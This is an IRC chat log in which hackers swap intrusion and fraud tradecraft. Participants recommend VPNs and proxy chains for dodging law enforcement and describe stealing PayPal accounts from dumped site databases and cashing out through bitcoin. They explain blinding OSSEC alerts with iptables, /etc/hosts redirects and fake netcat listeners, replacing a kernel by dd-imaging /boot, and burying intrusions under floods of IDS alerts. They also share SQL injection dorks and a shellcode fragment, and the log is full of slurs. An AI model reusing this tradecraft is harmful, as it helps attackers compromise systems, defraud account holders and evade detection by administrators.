(11:09:29 PM) Nyse: use swissvpn
(11:09:30 PM) Nyse: and smile.
(11:09:33 PM) Anorov: z3rod4ta, i am not an expert on the subject. the 2 ones i hear about are swissvpn and anonine though

(11:09:45 PM) Liberty: VPN from the pirate bay ppl
(11:09:47 PM) Anorov: ipred is considered good but i think it's slow
(11:09:49 PM) AnalTouring: but it's best to use a cheap ass box in china.
(11:09:55 PM) AnalTouring: or that jewish site i gave you, you can sploit it too.
(11:09:58 PM) Kitsune: it's a good thing i dont break the law then isnt it Anorov :D lol 
(11:10:01 PM) YaHMan: PRQ?
(11:10:04 PM) Nyse: anything out of the US
(11:10:06 PM) Nyse: is fine tbh
(11:10:16 PM) Anorov: well kitsune, hacking a girl's computer and using it as a proxy is probably illegal
(11:10:18 PM) YaHMan: beware of european data retention laws
(11:10:23 PM) zone: will do only if i gets recruited by mossad after AnalTouring 
(11:10:29 PM) Nyse: it's a bureaucratic mess to subpoena ips from foreign servers

(11:10:41 PM) Kitsune: not hacked Anorov she gave me control of it back when we was friends and was not smart enough to disable my account 
(11:10:45 PM) YaHMan: panama must be good then...they hate US.
(11:10:45 PM) Anorov: hmm
(11:10:53 PM) Anorov: alright
(11:11:09 PM) Anorov: if you were a carder or something they'd probably be able to trace you through it though
(11:11:28 PM) nachash: If you're a carder, you can never use enough proxies.
(11:11:37 PM) Kitsune: whats a carder?
(11:11:38 PM) AnalTouring: carding is for fags.
(11:11:43 PM) Liberty: carding is so 2001
(11:11:46 PM) nachash: carder = credit card fraud
(11:11:49 PM) AnalTouring: stealing is for homosexuals who can't into earning money.
(11:11:50 PM) Kitsune: ah
(11:11:56 PM) nachash: Someone steals a list of mag strip dumps
(11:12:01 PM) nachash: Sells them on the black market
(11:12:04 PM) Anorov: yeah i don't do it, but from all the shit i've read and seen
(11:12:07 PM) Liberty: track 1 and 2 baby
(11:12:11 PM) nachash: And them some eastern eurofag prints off cards and has hookers buy shit with them
(11:12:12 PM) AnalTouring: nacash: easier, i got thousands of paypals etc.
(11:12:15 PM) mom: or the purple market 
(11:12:19 PM) AnalTouring: nacash: or maybe i dont, id unno lol.
(11:12:20 PM) Anorov: it's the highest risk thing you can do
(11:12:33 PM) AnalTouring: nacash: you just milk the db of a big site, match user/pass with mail, get their paypals.
(11:12:42 PM) AnalTouring: paypal to bitcoin
(11:12:45 PM) AnalTouring: bitcoin to pocket.
(11:12:47 PM) nachash: But what I was gonna say was, I've read shit about Alberto Gonzalez and Max Butler.
(11:12:49 PM) Anorov: yeah all forms of money fraud fall under "carding"
(11:12:57 PM) Anorov: sort of
(11:12:58 PM) nachash: And those guys generally used something on the order of 20 proxies
(11:13:03 PM) sKyZ: doesn't bitcoin go back to your paypal?
(11:13:07 PM) Anorov: if i recall
(11:13:09 PM) DiggerNicks left the room (quit: Remote host closed the connection).

(11:13:12 PM) Liberty: skyz, no
(11:13:15 PM) YaHMan: nachash, slow....
(11:13:15 PM) Anorov: he got caught due to the feds finding a log
(11:13:18 PM) str4d: AnalTouring: yeah, it's the paypal to bitcoin step that's tricky at present...
(11:13:19 PM) nachash: Yeah, it's slow.
(11:13:21 PM) sKyZ: Liberty - then how do you cashout bitcoins?
(11:13:23 PM) Anorov: and in there they linked some usernames
(11:13:31 PM) Anorov: i think
(11:13:31 PM) YaHMan: sKyZ, you can get cash from silk road...
(11:13:31 PM) nachash: But they didn't get caught that way.
(11:13:31 PM) Kitsune: if i was going to start stealing paypals i would find a huge list of proxies and chain them till shit started timeing out then remove 1 so it works but is slow as fuck
(11:13:31 PM) YaHMan: in exchange for bitcoins
(11:13:31 PM) Liberty: Dwolla
(11:13:31 PM) nachash: They got caught via other means.
(11:13:33 PM) Liberty: or a 3rd party service
(11:13:36 PM) mom: i hire escorts with my bitcoins now. totally anonymous.
(11:13:38 PM) sKyZ: oic
(11:13:47 PM) nachash: Gonzalez had an eastern euro guy he was selling dumps do
(11:13:50 PM) Anorov: yeah
(11:13:50 PM) nachash: The guy went to Turkey
(11:13:53 PM) AnalTouring: MOM! WHAT ARE YOU DOING IN HERE!
(11:13:54 PM) Anorov: and they raided that guy i think
(11:13:55 PM) nachash: Got v&

(11:13:58 PM) AnalTouring: YOU'RE NOT SUPPOSED TO BE HERE!
(11:14:02 PM) nachash: And they tortured him until he gave up the pass to his laptop
(11:14:09 PM) nachash: And he had logs of fucking EVERYTHING
(11:14:18 PM) nachash: That's the tl;dr version
(11:14:19 PM) Anorov: yeah that's the thing with eastern europe. less chance of police going after you, but if they do they'll torture you probably
(11:14:20 PM) YaHMan: wow what an idiot...
(11:14:21 PM) AnalTouring: ok guise.
(11:14:22 PM) YaHMan: why log.
(11:14:27 PM) AnalTouring: STFU.

(1:31:52 AM) God: i must say: hatter does know his shit
(1:31:53 AM) zone: :3
(1:31:59 AM) AnalTouring: true.
(1:32:01 AM) dsr: injecting into kmem is very unstable
(1:32:04 AM) hatter: ^
(1:32:10 AM) AnalTouring: i know dsr:P
(1:32:37 AM) dsr: if only kexts were easier to hook
(1:32:38 AM) AnalTouring: it's also the fastest way if you have the shit to scan for.
(1:32:54 AM) whiteh8: so what do you do about samhain/ossec?
(1:33:00 AM) hatter: That depends
(1:33:08 AM) hatter: Ossec has a few flaws
(1:33:09 AM) LordKitsuna: whiteh8, cry yourself to sleep
(1:33:18 AM) God: Oh no he didnt
(1:33:33 AM) whiteh8: God, it's true, i did
(1:33:34 AM) whiteh8: wait
(1:33:47 AM) hatter: Like it doesn't do checksums on its integrity log.
(1:33:56 AM) hatter: additionally
(1:34:00 AM) hatter: You can also find out
(1:34:04 AM) hatter: where these notices are sent to
(1:34:20 AM) whiteh8: i saw some dude's chkroot get replaced by a bash script that just printed out everything was okay
(1:34:32 AM) hatter: not the same thing though
(1:34:34 AM) whiteh8: in a zine or something
(1:34:35 AM) Logging started. Future messages in this conversation will be logged.
(1:34:39 AM) God: Oh no he didn't
(1:34:42 AM) hatter: and use route or iptables to drop the traffic until your modifications are complete, maybe modify the /etc/hosts file and make a loopback netcat or something
(1:34:43 AM) whiteh8: no, but it was 
(1:34:46 AM) dsr: rofl
(1:34:50 AM) whiteh8: hilarious
(1:35:01 AM) hatter: let the notification engine think the notice went through
(1:35:07 AM) whiteh8: dsr, was that you? :p
(1:35:09 AM) dsr: /etc/hosts redirects are surprisingly effective i agree with hatter
(1:35:09 AM) hatter: make sure to update the integrity shit when you're done
(1:35:10 AM) zone: smart
(1:35:17 AM) hatter: so that way
(1:35:19 AM) hatter: when it comes back up
(1:35:26 AM) hatter: nothing came back as 'modified' in its syslog
(1:35:33 AM) hatter: now, if they've got the grsec shit cranked all the way up
(1:35:39 AM) hatter: you'll still be in deep shit
(1:35:52 AM) hatter: because it'll leave all your executes, associated with your ip, and all your chdir's
(1:35:54 AM) hatter: in a log file
(1:36:03 AM) hatter: kernel mode logging too
(1:36:09 AM) hatter: so you can't just turn the logging engine off.
(1:36:36 AM) AnalTouring: hatter: force it off by killin the kernel module with a yield statement.
(1:36:44 AM) AnalTouring: then replace the fucking kernel
(1:36:46 AM) AnalTouring: force a reboot
(1:36:50 AM) hatter: AnalTouring: you act like these things have kernel module support
(1:36:51 AM) AnalTouring: loud as fuck, but you have root.
(1:36:54 AM) AnalTouring: :P
(1:36:59 AM) hatter: kernel PATCH
(1:37:02 AM) DiggerNicks left the room (quit: Quit: WeeChat 0.3.4).
(1:37:04 AM) hatter: did I say module?
(1:37:10 AM) dsr: replacing the kernel is difficult as fuck
(1:37:19 AM) hatter: I like using ksplice for that
(1:37:19 AM) AnalTouring: dsr: not really.
(1:37:24 AM) hatter: or actually umounting /boot
(1:37:28 AM) dsr: and if you fuck it up a little the box is basically fucked and the admins will be looking at it very closely to figure out what happened
(1:37:30 AM) hatter: and then making a dd image of it
(1:37:38 AM) AnalTouring: dsr: true.
(1:37:47 AM) mode (+h dsr) by hatter
(1:38:05 AM) AnalTouring: anyways, brb.
(1:38:08 AM) AnalTouring: booze ran out.
(1:38:11 AM) dsr: plus if its a high profile box (which it almost guaranteed is going to be if its running kernel level protection) they will see it as intentional and equivelent to a rm -rf
(1:38:19 AM) hatter: ^
(1:38:28 AM) hatter: umount /boot
(1:38:31 AM) hatter: take a snapshot of it 
(1:38:32 AM) hatter: dd image
(1:38:36 AM) hatter: put it on a vm
(1:38:38 AM) hatter: with the same hardware
(1:38:41 AM) hatter: patch it
(1:38:45 AM) hatter: leave /boot unmounted
(1:38:48 AM) hatter: dd it back onto /boot
(1:39:04 AM) hatter: you have a kernel update without an actual overwrite on the fs, just a block device overwrite
(1:39:05 AM) dsr: yeah the ultimate backdoor solution is to just run it in a vm.. but that has its problems too
(1:39:15 AM) hatter: dsr: I meant for testing
(1:39:22 AM) hatter: testing the patched kernel
(1:39:22 AM) dsr: oh yeah
(1:39:42 AM) dsr: sorry i didnt read that whole block of text and jumped to a conclusion
(1:39:50 AM) zone: it takes a big fucking ton of work to get stuff done
(1:39:58 AM) zone: done properly that is
(1:40:12 AM) hatter: yep
(1:40:15 AM) dsr: i wrote a kext back in the day for bsd 
(1:40:18 AM) zone: well well
(1:40:24 AM) dsr: that hooked read and write and scanned for a keyword
(1:40:27 AM) zone: ill stick to low pro stuff till i get there
(1:40:32 AM) hatter: I wrote an nmi rootkit once
(1:40:35 AM) zone: but i bet this is gonna take years
(1:40:37 AM) hatter: that was fun
(1:40:56 AM) dsr: and any time it saw that keyword the proc that read/wrote it automatically would get root and it would hide traffic on a certain port
(1:41:02 AM) hatter: non maskable interrupt rootkit = win
(1:41:03 AM) hatter: lol
(1:41:44 AM) dsr: 99% of the time youre not going to need to go anywhere near the kernel zone
(1:41:47 AM) whiteh8: so it was completely dormant until a user typed in a special word?
(1:41:54 AM) dsr: what were talking about is kind of hacker porn
(1:42:00 AM) AnalTouring: dsr: true. and there's just some shit that's not worth doing.
(1:42:09 AM) zone: well
(1:42:10 AM) AnalTouring: dsr: there's always shit that's so locked down tha tyou dont want to come near it.
(1:42:16 AM) zone: if you are able to do it
(1:42:20 AM) AnalTouring: example: gentoo box i run.
(1:42:21 AM) dsr: yup
(1:42:23 AM) hatter: AnalTouring: never seen shit like that before
(1:42:26 AM) zone: i guess sometime you will feel the need to do it
(1:42:28 AM) zone: xD
(1:42:29 AM) AnalTouring: only open port: 80.
(1:42:29 AM) hatter: I aint scared of your gentoo install
(1:42:30 AM) hatter: lol
(1:42:32 AM) AnalTouring: static html pages.
(1:42:35 AM) dsr: generally if shit is that locked down... you probably shouldnt be fucking with it
(1:42:35 AM) AnalTouring: hardened gentoo.
(1:42:35 AM) hatter: well
(1:42:41 AM) hatter: still aint scared of it
(1:42:41 AM) AnalTouring: apache up to date and running in a chroot.
(1:42:42 AM) AnalTouring: no suid
(1:42:43 AM) hatter: but
(1:42:44 AM) AnalTouring: .nobody user.
(1:42:45 AM) hatter: Yea
(1:42:47 AM) AnalTouring: 2 level 2 filters.
(1:42:48 AM) hatter: static html
(1:42:50 AM) hatter: is a cunt
(1:42:51 AM) AnalTouring: one filter on the box itself.
(1:42:52 AM) hatter: lol
(1:43:03 AM) hatter: delete unnecessary functionality = less exposed vulnerability
(1:43:10 AM) hatter: chroot doesn't help much for security at all though
(1:43:14 AM) AnalTouring:  /boot in ext2, no ext2 drv in kernel.
(1:43:15 AM) hatter: I can access the main fs on any chroot
(1:43:22 AM) hatter: yeah I do the same thing with my /boot
(1:43:29 AM) hatter: but is your /dev/ node for boot read only?
(1:43:29 AM) AnalTouring:  /boot mounts a aufs image, writes go to ram instead of being saved.
(1:43:31 AM) zone: well but that keeps away most of people
(1:43:37 AM) AnalTouring:  hatter: yup.
(1:43:38 AM) zone: any added layer good layer amirite?
(1:43:49 AM) hatter: sometimes yes, sometimes no, zone 
(1:43:58 AM) hatter: sometimes the layer is what provides the vulnerability
(1:44:01 AM) hatter: Cisco IDS for example
(1:44:04 AM) AnalTouring:  lol.
(1:44:04 AM) hatter: that shit just makes me laugh
(1:44:07 AM) whiteh8: more hacker porn, this is rad
(1:44:16 AM) AnalTouring: more like neckbeard porn.
(1:44:22 AM) zone: lol
(1:44:25 AM) dsr: popping idses are fun
(1:44:45 AM) hatter: HI GUISE!  LETS MAKE A RH7.3 CONFIG AND RUN TCPDUMP 9 AND STRAP A PARSER ON IT AND CALL IT AN IDS!
(1:44:54 AM) dsr: get a couple slut boxes that has been pilfered to shit
(1:44:58 AM) hatter: We use kernel 2.4 and don't distribute any of the source to the OSS we stole!
(1:45:05 AM) hatter: WE WONT GET RAPED WILL WE?!!??!
(1:45:08 AM) dsr: make them packet the box / run a million nmaps / nessus scan
(1:45:13 AM) zone: lol'd hard
(1:45:16 AM) dsr: for like a couple days before
(1:45:19 AM) ashtray [xircon@F4866FE7.52662746.E7114913.IP] entered the room.
(1:45:32 AM) dsr: or do it through tor or something until the admins stop giving a shit about the alert logs
(1:45:36 AM) hatter: ^
(1:45:39 AM) whiteh8: ha
(1:45:54 AM) hatter: If you can't help firing alarms
(1:45:54 AM) hatter: make sure
(1:45:54 AM) hatter: you fire
(1:45:54 AM) hatter: ALL OF THEM
(1:45:54 AM) AnalTouring: dsr: i got a batch script named coverfire.
(1:45:54 AM) hatter: lol
(1:45:56 AM) dsr: word
(1:46:02 AM) AnalTouring: it nukes firewalls over TOR with SQLI, valid asm code, everything.
(1:46:13 AM) AnalTouring: convenient not?
(1:46:26 AM) dsr: yar ive used ddos before as a pretext to get in
(1:46:30 AM) FireStarter: i like it
(1:46:42 AM) dsr: the thing is people dont realize when were talking about shit like this is
(1:46:49 AM) curi0us: anal would you pastebin or something that
(1:47:09 AM) AnalTouring: aint got pasteban.
(1:47:10 AM) dsr: youre not defeating chroot or grsec or IDSes or mod_security or whatever
(1:47:17 AM) dsr: youre defeating the admin
(1:47:22 AM) AnalTouring: true
(1:47:26 AM) AnalTouring: .but that's enough.
(1:47:31 AM) dsr: if the admin doesnt give a fuck all the logs in the world are kinda useless
(1:47:33 AM) whiteh8: hands on se
(1:47:39 AM) zone: k enough self blowjobing
(1:47:43 AM) zone: teach us moar!
(1:47:46 AM) AnalTouring: if the admin could read the fucking tcp stream as it went by and decode the hex..
(1:47:52 AM) AnalTouring: see.
(1:47:58 AM) AnalTouring: you cant expect the admin to do everything.
(1:48:04 AM) AnalTouring: you just make his job so difficult that he can't do it:P
(1:48:25 AM) whiteh8: zone, this is oldie grizzling; pay attention :D
(1:48:36 AM) ***zone stfu's
(1:49:04 AM) AnalTouring: lulz.
(1:49:18 AM) AnalTouring: oldtime hacking was actually easier to me than SQLI now.
(1:49:26 AM) dsr: wat
(1:49:34 AM) AnalTouring: might take fucking ages to find a log or anything cool with a timed SQLI.
(1:49:42 AM) AnalTouring: back in the day, format string exploits.
(1:49:45 AM) AnalTouring: remember?
(1:49:46 AM) hatter: believe it or not, a lot of places have giant compliance shit
(1:49:46 AM) swan left the room (quit: Remote host closed the connection).
(1:49:55 AM) hatter: and there's a team
(1:49:57 AM) hatter: and they do nothing

(1:50:16 AM) dsr: im not old school at ALL.. but i think inurl:.php?id= is a little easier than packing shellcode and counting offsets
(1:50:24 AM) zone: guessing sony doesnt
(1:50:47 AM) AnalTouring: dsr: not at all. its what comes after injecting SQL that's a fucking bloody pain.
(1:50:59 AM) hatter: AnalTouring: you know shellcode for x86?
(1:51:03 AM) AnalTouring: dsr: also i like writing shellcode and circumventing stack protection
(1:51:12 AM) AnalTouring: hatter: some.
(1:51:20 AM) AnalTouring: hatter: been 4 years since i wrote my last one.
(1:51:28 AM) AnalTouring: hatter: i always cheated tough;)
(1:51:32 AM) hatter: hWORKX5WORK
(1:51:35 AM) hatter: what's that do?
(1:51:42 AM) hatter: Yes, that's valid polymorphic ascii shellcode
(1:51:52 AM) hatter: And anyone who knows bytecode can see that in their head.
(1:52:03 AM) AnalTouring: >bytecode
(1:52:06 AM) AnalTouring: >writing shellcode
(1:52:07 AM) AnalTouring: bish.
(1:52:12 AM) hatter: bytecode = shellcode
